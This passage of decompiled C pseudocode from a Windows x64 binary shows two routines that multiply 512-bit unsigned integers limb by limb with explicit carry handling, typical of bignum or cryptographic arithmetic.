  *((_QWORD *)&v145 + 1) += v142 + (unsigned __int64)v145 < v142;
  v147 = *((_QWORD *)&v145 + 1) + v143;
  v148 = (v147 < *((_QWORD *)&v145 + 1)) + v144;
  v149 = a2[5] * (unsigned __int128)a3[3];
  v150 = v146 + v149;
  *((_QWORD *)&v149 + 1) += v146 + (unsigned __int64)v149 < v146;
  v151 = *((_QWORD *)&v149 + 1) + v147;
  v152 = (v151 < *((_QWORD *)&v149 + 1)) + v148;
  v153 = a2[6] * (unsigned __int128)a3[2];
  v154 = v150 + v153;
  *((_QWORD *)&v153 + 1) += v150 + (unsigned __int64)v153 < v150;
  v155 = *((_QWORD *)&v153 + 1) + v151;
  v156 = (v155 < *((_QWORD *)&v153 + 1)) + v152;
  v157 = a2[7] * (unsigned __int128)a3[1];
  *(_QWORD *)&v157 = v154 + v157;
  a1[8] = v157;
  *((_QWORD *)&v157 + 1) += (unsigned __int64)v157 < v154;
  v158 = *((_QWORD *)&v157 + 1) + v155;
  v159 = (v158 < *((_QWORD *)&v157 + 1)) + v156;
  v160 = a2[2] * (unsigned __int128)a3[7];
  v161 = v158 + v160;
  *((_QWORD *)&v160 + 1) += v158 + (unsigned __int64)v160 < v158;
  v162 = *((_QWORD *)&v160 + 1) + v159;
  v163 = v162 < *((_QWORD *)&v160 + 1);
  v164 = a2[3] * (unsigned __int128)a3[6];
  v165 = v161 + v164;
  *((_QWORD *)&v164 + 1) += v161 + (unsigned __int64)v164 < v161;
  v166 = *((_QWORD *)&v164 + 1) + v162;
  v167 = (v166 < *((_QWORD *)&v164 + 1)) + v163;
  v168 = a2[4] * (unsigned __int128)a3[5];
  v169 = v165 + v168;
  *((_QWORD *)&v168 + 1) += v165 + (unsigned __int64)v168 < v165;
  v170 = *((_QWORD *)&v168 + 1) + v166;
  v171 = (v170 < *((_QWORD *)&v168 + 1)) + v167;
  v172 = a2[5] * (unsigned __int128)a3[4];
  v173 = v169 + v172;
  *((_QWORD *)&v172 + 1) += v169 + (unsigned __int64)v172 < v169;
  v174 = *((_QWORD *)&v172 + 1) + v170;
  v175 = (v174 < *((_QWORD *)&v172 + 1)) + v171;
  v176 = a2[6] * (unsigned __int128)a3[3];
  v177 = v173 + v176;
  *((_QWORD *)&v176 + 1) += v173 + (unsigned __int64)v176 < v173;
  v178 = *((_QWORD *)&v176 + 1) + v174;
  v179 = (v178 < *((_QWORD *)&v176 + 1)) + v175;
  v180 = a2[7] * (unsigned __int128)a3[2];
  *(_QWORD *)&v180 = v177 + v180;
  a1[9] = v180;
  *((_QWORD *)&v180 + 1) += (unsigned __int64)v180 < v177;
  v181 = *((_QWORD *)&v180 + 1) + v178;
  v182 = (v181 < *((_QWORD *)&v180 + 1)) + v179;
  v183 = a2[3] * (unsigned __int128)a3[7];
  v184 = v181 + v183;
  *((_QWORD *)&v183 + 1) += v181 + (unsigned __int64)v183 < v181;
  v185 = *((_QWORD *)&v183 + 1) + v182;
  v186 = v185 < *((_QWORD *)&v183 + 1);
  v187 = a2[4] * (unsigned __int128)a3[6];
  v188 = v184 + v187;
  *((_QWORD *)&v187 + 1) += v184 + (unsigned __int64)v187 < v184;
  v189 = *((_QWORD *)&v187 + 1) + v185;
  v190 = (v189 < *((_QWORD *)&v187 + 1)) + v186;
  v191 = a2[5] * (unsigned __int128)a3[5];
  v192 = v188 + v191;
  *((_QWORD *)&v191 + 1) += v188 + (unsigned __int64)v191 < v188;
  v193 = *((_QWORD *)&v191 + 1) + v189;
  v194 = (v193 < *((_QWORD *)&v191 + 1)) + v190;
  v195 = a2[6] * (unsigned __int128)a3[4];
  v196 = v192 + v195;
  *((_QWORD *)&v195 + 1) += v192 + (unsigned __int64)v195 < v192;
  v197 = *((_QWORD *)&v195 + 1) + v193;
  v198 = (v197 < *((_QWORD *)&v195 + 1)) + v194;
  v199 = a2[7] * (unsigned __int128)a3[3];
  *(_QWORD *)&v199 = v196 + v199;
  a1[10] = v199;
  *((_QWORD *)&v199 + 1) += (unsigned __int64)v199 < v196;
  v200 = *((_QWORD *)&v199 + 1) + v197;
  v201 = (v200 < *((_QWORD *)&v199 + 1)) + v198;
  v202 = a2[4] * (unsigned __int128)a3[7];
  v203 = v200 + v202;
  *((_QWORD *)&v202 + 1) += v200 + (unsigned __int64)v202 < v200;
  v204 = *((_QWORD *)&v202 + 1) + v201;
  v205 = v204 < *((_QWORD *)&v202 + 1);
  v206 = a2[5] * (unsigned __int128)a3[6];
  v207 = v203 + v206;
  *((_QWORD *)&v206 + 1) += v203 + (unsigned __int64)v206 < v203;
  v208 = *((_QWORD *)&v206 + 1) + v204;
  v209 = (v208 < *((_QWORD *)&v206 + 1)) + v205;
  v210 = a2[6] * (unsigned __int128)a3[5];
  v211 = v207 + v210;
  *((_QWORD *)&v210 + 1) += v207 + (unsigned __int64)v210 < v207;
  v212 = *((_QWORD *)&v210 + 1) + v208;
  v213 = (v212 < *((_QWORD *)&v210 + 1)) + v209;
  v214 = a2[7] * (unsigned __int128)a3[4];
  *(_QWORD *)&v214 = v211 + v214;
  a1[11] = v214;
  *((_QWORD *)&v214 + 1) += (unsigned __int64)v214 < v211;
  v215 = *((_QWORD *)&v214 + 1) + v212;
  v216 = (v215 < *((_QWORD *)&v214 + 1)) + v213;
  v217 = a2[5] * (unsigned __int128)a3[7];
  v218 = v215 + v217;
  *((_QWORD *)&v217 + 1) += v215 + (unsigned __int64)v217 < v215;
  v219 = *((_QWORD *)&v217 + 1) + v216;
  v220 = v219 < *((_QWORD *)&v217 + 1);
  v221 = a2[6] * (unsigned __int128)a3[6];
  v222 = v218 + v221;
  *((_QWORD *)&v221 + 1) += v218 + (unsigned __int64)v221 < v218;
  v223 = *((_QWORD *)&v221 + 1) + v219;
  v224 = (v223 < *((_QWORD *)&v221 + 1)) + v220;
  v225 = a2[7] * (unsigned __int128)a3[5];
  *(_QWORD *)&v225 = v222 + v225;
  a1[12] = v225;
  *((_QWORD *)&v225 + 1) += (unsigned __int64)v225 < v222;
  v226 = *((_QWORD *)&v225 + 1) + v223;
  v227 = (v226 < *((_QWORD *)&v225 + 1)) + v224;
  v228 = a2[6] * (unsigned __int128)a3[7];
  v229 = v226 + v228;
  *((_QWORD *)&v228 + 1) += v226 + (unsigned __int64)v228 < v226;
  v230 = *((_QWORD *)&v228 + 1) + v227;
  v231 = v230 < *((_QWORD *)&v228 + 1);
  v232 = a2[7] * (unsigned __int128)a3[6];
  *(_QWORD *)&v232 = v229 + v232;
  a1[13] = v232;
  *((_QWORD *)&v232 + 1) += (unsigned __int64)v232 < v229;
  v233 = *((_QWORD *)&v232 + 1) + v230;
  v234 = (v233 < *((_QWORD *)&v232 + 1)) + v231;
  v235 = a2[7] * (unsigned __int128)a3[7];
  result = v233 + v235;
  a1[14] = result;
  a1[15] = v234 + (result < v233) + *((_QWORD *)&v235 + 1);
  return result;
}

//----- (000000013F117C30) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F117C30(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // rcx
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // r9
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r8
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // r11
  unsigned __int64 v19; // rax
  __int64 v20; // r8
  unsigned __int64 v21; // r8
  unsigned __int64 v22; // rcx
  unsigned __int64 v23; // r9
  unsigned __int64 v24; // r14
  unsigned __int64 v25; // rbp
  unsigned __int64 v26; // rcx
  unsigned __int64 v27; // rsi
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rbx
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // r9
  unsigned __int128 v33; // rax
  unsigned __int64 v34; // r11
  unsigned __int64 v35; // r8
  _BOOL8 v36; // r10
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r9
  unsigned __int64 v39; // rcx
  _BOOL8 v40; // r10
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // r9
  _BOOL8 v44; // r10
  unsigned __int128 v45; // rax
  unsigned __int64 v46; // rcx
  unsigned __int64 v47; // r9
  _BOOL8 v48; // r10
  unsigned __int128 v49; // rax
  unsigned __int64 v50; // r9
  _BOOL8 v51; // r10
  unsigned __int128 v52; // rax
  unsigned __int64 v53; // rcx
  unsigned __int64 v54; // r10
  _BOOL8 v55; // r9
  unsigned __int128 v56; // rax
  unsigned __int64 v57; // r8
  unsigned __int64 v58; // r10
  _BOOL8 v59; // r9
  unsigned __int128 v60; // rax
  unsigned __int64 v61; // rcx
  unsigned __int64 v62; // r10
  _BOOL8 v63; // r9
  unsigned __int128 v64; // rax
  unsigned __int64 v65; // r8
  unsigned __int64 v66; // r10
  _BOOL8 v67; // r9
  unsigned __int128 v68; // rax
  unsigned __int64 v69; // rcx
  unsigned __int64 v70; // r10
  _BOOL8 v71; // r9
  unsigned __int128 v72; // rax
  unsigned __int64 v73; // r10
  _BOOL8 v74; // r9
  unsigned __int128 v75; // rax
  unsigned __int64 v76; // rcx
  unsigned __int64 v77; // r9
  _BOOL8 v78; // r10
  unsigned __int128 v79; // rax
  unsigned __int64 v80; // r8
  unsigned __int64 v81; // r9
  _BOOL8 v82; // r10
  unsigned __int128 v83; // rax
  unsigned __int64 v84; // rcx
  unsigned __int64 v85; // r9
  _BOOL8 v86; // r10
  unsigned __int128 v87; // rax
  unsigned __int64 v88; // r8
  unsigned __int64 v89; // r9
  _BOOL8 v90; // r10
  unsigned __int128 v91; // rax
  unsigned __int64 v92; // rcx
  unsigned __int64 v93; // r9
  _BOOL8 v94; // r10
  unsigned __int128 v95; // rax
  unsigned __int64 v96; // r8
  unsigned __int64 v97; // r9
  _BOOL8 v98; // r10
  unsigned __int128 v99; // rax
  unsigned __int64 v100; // r9
  _BOOL8 v101; // r10
  unsigned __int128 v102; // rax
  unsigned __int64 v103; // rcx
  unsigned __int64 v104; // r10
  _BOOL8 v105; // r9
  unsigned __int128 v106; // rax
  unsigned __int64 v107; // r8
  unsigned __int64 v108; // r10
  _BOOL8 v109; // r9
  unsigned __int128 v110; // rax
  unsigned __int64 v111; // rcx
  unsigned __int64 v112; // r10
  _BOOL8 v113; // r9
  unsigned __int128 v114; // rax
  unsigned __int64 v115; // r8
  unsigned __int64 v116; // r10
  _BOOL8 v117; // r9
  unsigned __int128 v118; // rax
  unsigned __int64 v119; // rcx
  unsigned __int64 v120; // r10
  _BOOL8 v121; // r9
  unsigned __int128 v122; // rax
  unsigned __int64 v123; // r8
  unsigned __int64 v124; // r10
  _BOOL8 v125; // r9
  unsigned __int128 v126; // rax
  unsigned __int64 v127; // rcx
  unsigned __int64 v128; // r10
  _BOOL8 v129; // r9
  unsigned __int128 v130; // rax
  unsigned __int64 v131; // r10
  _BOOL8 v132; // r9
  unsigned __int128 v133; // rax
  unsigned __int64 v134; // rcx
  unsigned __int64 v135; // r9
  _BOOL8 v136; // r10
  unsigned __int128 v137; // rax
  unsigned __int64 v138; // r8
  unsigned __int64 v139; // r9
  _BOOL8 v140; // r10
  unsigned __int128 v141; // rax
  unsigned __int64 v142; // rcx
  unsigned __int64 v143; // r9
  _BOOL8 v144; // r10
  unsigned __int128 v145; // rax
  unsigned __int64 v146; // r8
  unsigned __int64 v147; // r9
  _BOOL8 v148; // r10
  unsigned __int128 v149; // rax
  unsigned __int64 v150; // rcx
  unsigned __int64 v151; // r9
  _BOOL8 v152; // r10
  unsigned __int128 v153; // rax
  unsigned __int64 v154; // r8
  unsigned __int64 v155; // r9
  _BOOL8 v156; // r10
  unsigned __int128 v157; // rax
  unsigned __int64 v158; // rcx
  unsigned __int64 v159; // r9
  _BOOL8 v160; // r10
  unsigned __int128 v161; // rax
  unsigned __int64 v162; // r8
  unsigned __int64 v163; // r9
  _BOOL8 v164; // r10
  unsigned __int128 v165; // rax
  unsigned __int64 v166; // r9
  _BOOL8 v167; // r10
  unsigned __int128 v168; // rax
  unsigned __int64 v169; // rcx
  unsigned __int64 v170; // r10
  _BOOL8 v171; // r9
  unsigned __int128 v172; // rax
  unsigned __int64 v173; // r8
  unsigned __int64 v174; // r10
  _BOOL8 v175; // r9
  unsigned __int128 v176; // rax
  unsigned __int64 v177; // rcx
  unsigned __int64 v178; // r10
  _BOOL8 v179; // r9
  unsigned __int128 v180; // rax
  unsigned __int64 v181; // r8
  unsigned __int64 v182; // r10
  _BOOL8 v183; // r9
  unsigned __int128 v184; // rax
  unsigned __int64 v185; // rcx
  unsigned __int64 v186; // r10
  _BOOL8 v187; // r9
  unsigned __int128 v188; // rax
  unsigned __int64 v189; // r8
  unsigned __int64 v190; // r10
  _BOOL8 v191; // r9
  unsigned __int128 v192; // rax
  unsigned __int64 v193; // rcx
  unsigned __int64 v194; // r10
  _BOOL8 v195; // r9
  unsigned __int128 v196; // rax
  unsigned __int64 v197; // r8
  unsigned __int64 v198; // r10
  _BOOL8 v199; // r9
  unsigned __int128 v200; // rax
  unsigned __int64 v201; // rcx
  unsigned __int64 v202; // r10
  _BOOL8 v203; // r9
  unsigned __int128 v204; // rax
  unsigned __int64 v205; // r10
  _BOOL8 v206; // r9
  unsigned __int128 v207; // rax
  unsigned __int64 v208; // rcx
  unsigned __int64 v209; // r9
  _BOOL8 v210; // r10
  unsigned __int128 v211; // rax
  unsigned __int64 v212; // r8
  unsigned __int64 v213; // r9
  _BOOL8 v214; // r10
  unsigned __int128 v215; // rax
  unsigned __int64 v216; // rcx
  unsigned __int64 v217; // r9
  _BOOL8 v218; // r10
  unsigned __int128 v219; // rax
  unsigned __int64 v220; // r8
  unsigned __int64 v221; // r9
  _BOOL8 v222; // r10
  unsigned __int128 v223; // rax
  unsigned __int64 v224; // rcx
  unsigned __int64 v225; // r9
  _BOOL8 v226; // r10
  unsigned __int128 v227; // rax
  unsigned __int64 v228; // r8
  unsigned __int64 v229; // r9
  _BOOL8 v230; // r10
  unsigned __int128 v231; // rax
  unsigned __int64 v232; // rcx
  unsigned __int64 v233; // r9
  _BOOL8 v234; // r10
  unsigned __int128 v235; // rax
  unsigned __int64 v236; // r8
  unsigned __int64 v237; // r9
  _BOOL8 v238; // r10
  unsigned __int128 v239; // rax
  unsigned __int64 v240; // rcx
  unsigned __int64 v241; // r9
  _BOOL8 v242; // r10
  unsigned __int128 v243; // rax
  unsigned __int64 v244; // r8
  unsigned __int64 v245; // r9
  _BOOL8 v246; // r10
  unsigned __int128 v247; // rax
  unsigned __int64 v248; // r9
  __int64 v249; // r10
  unsigned __int128 v250; // rax
  unsigned __int64 v251; // rcx
  unsigned __int64 v252; // r10
  _BOOL8 v253; // r9
  unsigned __int128 v254; // rax
  unsigned __int64 v255; // r8
  unsigned __int64 v256; // r10
  _BOOL8 v257; // r9
  unsigned __int128 v258; // rax
  unsigned __int64 v259; // rcx
  unsigned __int64 v260; // r10
  _BOOL8 v261; // r9
  unsigned __int128 v262; // rax
  unsigned __int64 v263; // r8
  unsigned __int64 v264; // r10
  _BOOL8 v265; // r9
  unsigned __int128 v266; // rax
  unsigned __int64 v267; // rcx
  unsigned __int64 v268; // r10
  _BOOL8 v269; // r9
  unsigned __int128 v270; // rax
  unsigned __int64 v271; // r8
  unsigned __int64 v272; // r10
  _BOOL8 v273; // r9
  unsigned __int128 v274; // rax
  unsigned __int64 v275; // rcx
  unsigned __int64 v276; // r10
  _BOOL8 v277; // r9
  unsigned __int128 v278; // rax
  unsigned __int64 v279; // r8
  unsigned __int64 v280; // r10
  _BOOL8 v281; // r9
  unsigned __int128 v282; // rax
  unsigned __int64 v283; // rcx
  unsigned __int64 v284; // r10
  _BOOL8 v285; // r9
  unsigned __int128 v286; // rax
  unsigned __int64 v287; // r8
  unsigned __int64 v288; // r10
  _BOOL8 v289; // r9
  unsigned __int128 v290; // rax
  unsigned __int64 v291; // rcx
  unsigned __int64 v292; // r10
  __int64 v293; // r9
  unsigned __int128 v294; // rax
  unsigned __int64 v295; // r10
  __int64 v296; // r9
  unsigned __int128 v297; // rax
  unsigned __int64 v298; // rcx
  unsigned __int64 v299; // r9
  _BOOL8 v300; // r10
  unsigned __int128 v301; // rax
  unsigned __int64 v302; // r8
  unsigned __int64 v303; // r9
  _BOOL8 v304; // r10
  unsigned __int128 v305; // rax
  unsigned __int64 v306; // rcx
  unsigned __int64 v307; // r9
  _BOOL8 v308; // r10
  unsigned __int128 v309; // rax
  unsigned __int64 v310; // r8
  unsigned __int64 v311; // r9
  _BOOL8 v312; // r10
  unsigned __int128 v313; // rax
  unsigned __int64 v314; // rcx
  unsigned __int64 v315; // r9
  _BOOL8 v316; // r10
  unsigned __int128 v317; // rax
  unsigned __int64 v318; // r8
  unsigned __int64 v319; // r9
  _BOOL8 v320; // r10
  unsigned __int128 v321; // rax
  unsigned __int64 v322; // rcx
  unsigned __int64 v323; // r9
  _BOOL8 v324; // r10
  unsigned __int128 v325; // rax
  unsigned __int64 v326; // r8
  unsigned __int64 v327; // r9
  _BOOL8 v328; // r10
  unsigned __int128 v329; // rax
  unsigned __int64 v330; // rcx
  unsigned __int64 v331; // r9
  _BOOL8 v332; // r10
  unsigned __int128 v333; // rax
  unsigned __int64 v334; // r8
  unsigned __int64 v335; // r9
  _BOOL8 v336; // r10
  unsigned __int128 v337; // rax
  unsigned __int64 v338; // rcx
  unsigned __int64 v339; // r9
  __int64 v340; // r10
  unsigned __int128 v341; // rax
  unsigned __int64 v342; // r8
  unsigned __int64 v343; // r9
  __int64 v344; // r10
  unsigned __int128 v345; // rax
  unsigned __int64 v346; // r9
  __int64 v347; // r10
  unsigned __int128 v348; // rax
  unsigned __int64 v349; // rcx
  unsigned __int64 v350; // r10
  _BOOL8 v351; // r15
  unsigned __int128 v352; // rax
  unsigned __int64 v353; // r8
  unsigned __int64 v354; // r10
  _BOOL8 v355; // r15
  unsigned __int128 v356; // rax
  unsigned __int64 v357; // rcx
  unsigned __int64 v358; // r10
  _BOOL8 v359; // r15
  unsigned __int128 v360; // rax
  unsigned __int64 v361; // r8
  unsigned __int64 v362; // r10
  _BOOL8 v363; // r15
  unsigned __int128 v364; // rax
  unsigned __int64 v365; // rcx
  unsigned __int64 v366; // r10
  _BOOL8 v367; // r15
  unsigned __int128 v368; // rax
  unsigned __int64 v369; // r8
  unsigned __int64 v370; // r10
  _BOOL8 v371; // r15
  unsigned __int128 v372; // rax
  unsigned __int64 v373; // rcx
  unsigned __int64 v374; // r10
  _BOOL8 v375; // r15
  unsigned __int128 v376; // rax
  unsigned __int64 v377; // r8
  unsigned __int64 v378; // r10
  _BOOL8 v379; // r15
  unsigned __int128 v380; // rax
  unsigned __int64 v381; // rcx
  unsigned __int64 v382; // r10
  _BOOL8 v383; // r15
  unsigned __int128 v384; // rax
  unsigned __int64 v385; // r8
  unsigned __int64 v386; // r10
  _BOOL8 v387; // r15
  unsigned __int128 v388; // rax
  unsigned __int64 v389; // rcx
  unsigned __int64 v390; // r10
  __int64 v391; // r15
  unsigned __int128 v392; // rax
  unsigned __int64 v393; // r8
  unsigned __int64 v394; // r10
  __int64 v395; // r15
  unsigned __int128 v396; // rax
  unsigned __int64 v397; // rcx
  unsigned __int64 v398; // r10
  __int64 v399; // r15
  unsigned __int128 v400; // rax
  unsigned __int64 v401; // r10
  __int64 v402; // r15
  unsigned __int128 v403; // rax
  unsigned __int64 v404; // rcx
  __int64 v405; // r15
  unsigned __int128 v406; // rax
  unsigned __int64 v407; // r8
  __int64 v408; // r15
  unsigned __int128 v409; // rax
  unsigned __int64 v410; // rcx
  __int64 v411; // r15
  unsigned __int128 v412; // rax
  unsigned __int64 v413; // r8
  __int64 v414; // r15
  unsigned __int128 v415; // rax
  unsigned __int64 v416; // rcx
  __int64 v417; // r15
  unsigned __int128 v418; // rax
  unsigned __int64 v419; // r8
  __int64 v420; // r15
  unsigned __int128 v421; // rax
  unsigned __int64 v422; // rcx
  __int64 v423; // r15
  unsigned __int128 v424; // rax
  unsigned __int64 v425; // r8
  __int64 v426; // r15
  unsigned __int128 v427; // rax
  unsigned __int64 v428; // rcx
  __int64 v429; // r15
  unsigned __int128 v430; // rax
  unsigned __int64 v431; // r8
  __int64 v432; // r15
  unsigned __int128 v433; // rax
  unsigned __int64 v434; // rcx
  __int64 v435; // r15
  unsigned __int128 v436; // rax
  unsigned __int64 v437; // r8
  __int64 v438; // r15
  unsigned __int128 v439; // rax
  unsigned __int64 v440; // rcx
  __int64 v441; // r15
  unsigned __int128 v442; // rax
  unsigned __int64 v443; // r8
  __int64 v444; // r15
  unsigned __int128 v445; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + *a2 * a3[2];
  v15 = (v14 < v13) + ((*a2 * (unsigned __int128)a3[2]) >> 64);
  v16 = (v13 < v12) + v15;
  v17 = v14 + a2[1] * a3[1];
  v18 = (v17 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v19 = v17 + a2[2] * *a3;
  v20 = (a2[2] * (unsigned __int128)*a3) >> 64;
  a1[2] = v19;
  v21 = (v19 < v17) + v20;
  v22 = v16 + v18 + v21;
  v23 = v22 + *a2 * a3[3];
  v24 = (v23 < v22) + ((*a2 * (unsigned __int128)a3[3]) >> 64);
  v25 = (v16 + v18 < v18) + v24 + (v16 < v15) + (unsigned __int64)(v22 < v21);
  v26 = v23 + a2[1] * a3[2];
  v27 = (v26 < v23) + ((a2[1] * (unsigned __int128)a3[2]) >> 64);
  v28 = v26 + a2[2] * a3[1];
  v29 = (v28 < v26) + ((a2[2] * (unsigned __int128)a3[1]) >> 64);
  v30 = v29 + v27 + v25;
  v31 = v28 + a2[3] * *a3;
  v32 = (v31 < v28) + ((a2[3] * (unsigned __int128)*a3) >> 64);
  a1[3] = v31;
  v33 = *a2 * (unsigned __int128)a3[4];
  v34 = v32 + v30 + v33;
  *((_QWORD *)&v33 + 1) += v34 < v32 + v30;
  v35 = (v30 < v29) + (unsigned __int64)(v32 + v30 < v32) + (v25 < v24) + (v27 + v25 < v27) + *((_QWORD *)&v33 + 1);
  v36 = v35 < *((_QWORD *)&v33 + 1);
  v37 = a2[1] * (unsigned __int128)a3[3];
  v38 = v34 + v37;
  *((_QWORD *)&v37 + 1) += v34 + (unsigned __int64)v37 < v34;
  v39 = v35 + *((_QWORD *)&v37 + 1);
  v40 = (v35 + *((_QWORD *)&v37 + 1) < *((_QWORD *)&v37 + 1)) + v36;
  v41 = a2[2] * (unsigned __int128)a3[2];
  v42 = v38 + v41;
  *((_QWORD *)&v41 + 1) += v38 + (unsigned __int64)v41 < v38;
  v43 = *((_QWORD *)&v41 + 1) + v39;
  v44 = (*((_QWORD *)&v41 + 1) + v39 < *((_QWORD *)&v41 + 1)) + v40;
  v45 = a2[3] * (unsigned __int128)a3[1];
  v46 = v42 + v45;
  *((_QWORD *)&v45 + 1) += v42 + (unsigned __int64)v45 < v42;
  v47 = *((_QWORD *)&v45 + 1) + v43;
  v48 = (v47 < *((_QWORD *)&v45 + 1)) + v44;
  v49 = a2[4] * (unsigned __int128)*a3;
  *(_QWORD *)&v49 = v46 + v49;
  a1[4] = v49;
  *((_QWORD *)&v49 + 1) += (unsigned __int64)v49 < v46;
  v50 = *((_QWORD *)&v49 + 1) + v47;
  v51 = (v50 < *((_QWORD *)&v49 + 1)) + v48;
  v52 = *a2 * (unsigned __int128)a3[5];
  v53 = v50 + v52;
  *((_QWORD *)&v52 + 1) += v50 + (unsigned __int64)v52 < v50;
  v54 = *((_QWORD *)&v52 + 1) + v51;
  v55 = v54 < *((_QWORD *)&v52 + 1);
  v56 = a2[1] * (unsigned __int128)a3[4];
  v57 = v53 + v56;
  *((_QWORD *)&v56 + 1) += v53 + (unsigned __int64)v56 < v53;
  v58 = *((_QWORD *)&v56 + 1) + v54;
  v59 = (v58 < *((_QWORD *)&v56 + 1)) + v55;
  v60 = a2[2] * (unsigned __int128)a3[3];
  v61 = v57 + v60;
  *((_QWORD *)&v60 + 1) += v57 + (unsigned __int64)v60 < v57;
  v62 = *((_QWORD *)&v60 + 1) + v58;
  v63 = (v62 < *((_QWORD *)&v60 + 1)) + v59;
  v64 = a2[3] * (unsigned __int128)a3[2];
  v65 = v61 + v64;
  *((_QWORD *)&v64 + 1) += v61 + (unsigned __int64)v64 < v61;
  v66 = *((_QWORD *)&v64 + 1) + v62;
  v67 = (v66 < *((_QWORD *)&v64 + 1)) + v63;
  v68 = a2[4] * (unsigned __int128)a3[1];
  v69 = v65 + v68;
  *((_QWORD *)&v68 + 1) += v65 + (unsigned __int64)v68 < v65;
  v70 = *((_QWORD *)&v68 + 1) + v66;
  v71 = (v70 < *((_QWORD *)&v68 + 1)) + v67;
  v72 = a2[5] * (unsigned __int128)*a3;
  *(_QWORD *)&v72 = v69 + v72;
  a1[5] = v72;
  *((_QWORD *)&v72 + 1) += (unsigned __int64)v72 < v69;
  v73 = *((_QWORD *)&v72 + 1) + v70;
  v74 = (v73 < *((_QWORD *)&v72 + 1)) + v71;
  v75 = *a2 * (unsigned __int128)a3[6];
  v76 = v73 + v75;
  *((_QWORD *)&v75 + 1) += v73 + (unsigned __int64)v75 < v73;
  v77 = *((_QWORD *)&v75 + 1) + v74;
  v78 = v77 < *((_QWORD *)&v75 + 1);
  v79 = a2[1] * (unsigned __int128)a3[5];
  v80 = v76 + v79;
  *((_QWORD *)&v79 + 1) += v76 + (unsigned __int64)v79 < v76;
  v81 = *((_QWORD *)&v79 + 1) + v77;
  v82 = (v81 < *((_QWORD *)&v79 + 1)) + v78;
  v83 = a2[2] * (unsigned __int128)a3[4];
  v84 = v80 + v83;
  *((_QWORD *)&v83 + 1) += v80 + (unsigned __int64)v83 < v80;
  v85 = *((_QWORD *)&v83 + 1) + v81;
  v86 = (v85 < *((_QWORD *)&v83 + 1)) + v82;
  v87 = a2[3] * (unsigned __int128)a3[3];
  v88 = v84 + v87;
  *((_QWORD *)&v87 + 1) += v84 + (unsigned __int64)v87 < v84;
  v89 = *((_QWORD *)&v87 + 1) + v85;
  v90 = (v89 < *((_QWORD *)&v87 + 1)) + v86;
  v91 = a2[4] * (unsigned __int128)a3[2];
  v92 = v88 + v91;
  *((_QWORD *)&v91 + 1) += v88 + (unsigned __int64)v91 < v88;
  v93 = *((_QWORD *)&v91 + 1) + v89;
  v94 = (v93 < *((_QWORD *)&v91 + 1)) + v90;
  v95 = a2[5] * (unsigned __int128)a3[1];
  v96 = v92 + v95;
  *((_QWORD *)&v95 + 1) += v92 + (unsigned __int64)v95 < v92;
  v97 = *((_QWORD *)&v95 + 1) + v93;
  v98 = (v97 < *((_QWORD *)&v95 + 1)) + v94;
  v99 = a2[6] * (unsigned __int128)*a3;
  *(_QWORD *)&v99 = v96 + v99;
  a1[6] = v99;
  *((_QWORD *)&v99 + 1) += (unsigned __int64)v99 < v96;
  v100 = *((_QWORD *)&v99 + 1) + v97;
  v101 = (v100 < *((_QWORD *)&v99 + 1)) + v98;
  v102 = *a2 * (unsigned __int128)a3[7];
  v103 = v100 + v102;
  *((_QWORD *)&v102 + 1) += v100 + (unsigned __int64)v102 < v100;
  v104 = *((_QWORD *)&v102 + 1) + v101;
  v105 = v104 < *((_QWORD *)&v102 + 1);
  v106 = a2[1] * (unsigned __int128)a3[6];
  v107 = v103 + v106;
  *((_QWORD *)&v106 + 1) += v103 + (unsigned __int64)v106 < v103;
  v108 = *((_QWORD *)&v106 + 1) + v104;
  v109 = (v108 < *((_QWORD *)&v106 + 1)) + v105;
  v110 = a2[2] * (unsigned __int128)a3[5];
  v111 = v107 + v110;
  *((_QWORD *)&v110 + 1) += v107 + (unsigned __int64)v110 < v107;
  v112 = *((_QWORD *)&v110 + 1) + v108;
  v113 = (v112 < *((_QWORD *)&v110 + 1)) + v109;
  v114 = a2[3] * (unsigned __int128)a3[4];
  v115 = v111 + v114;
  *((_QWORD *)&v114 + 1) += v111 + (unsigned __int64)v114 < v111;
  v116 = *((_QWORD *)&v114 + 1) + v112;
  v117 = (v116 < *((_QWORD *)&v114 + 1)) + v113;
  v118 = a2[4] * (unsigned __int128)a3[3];
  v119 = v115 + v118;
  *((_QWORD *)&v118 + 1) += v115 + (unsigned __int64)v118 < v115;
  v120 = *((_QWORD *)&v118 + 1) + v116;
  v121 = (v120 < *((_QWORD *)&v118 + 1)) + v117;
  v122 = a2[5] * (unsigned __int128)a3[2];
  v123 = v119 + v122;
  *((_QWORD *)&v122 + 1) += v119 + (unsigned __int64)v122 < v119;
  v124 = *((_QWORD *)&v122 + 1) + v120;
  v125 = (v124 < *((_QWORD *)&v122 + 1)) + v121;
  v126 = a2[6] * (unsigned __int128)a3[1];
  v127 = v123 + v126;
  *((_QWORD *)&v126 + 1) += v123 + (unsigned __int64)v126 < v123;
  v128 = *((_QWORD *)&v126 + 1) + v124;
  v129 = (v128 < *((_QWORD *)&v126 + 1)) + v125;
  v130 = a2[7] * (unsigned __int128)*a3;
  *(_QWORD *)&v130 = v127 + v130;
  a1[7] = v130;
  *((_QWORD *)&v130 + 1) += (unsigned __int64)v130 < v127;
  v131 = *((_QWORD *)&v130 + 1) + v128;
  v132 = (v131 < *((_QWORD *)&v130 + 1)) + v129;
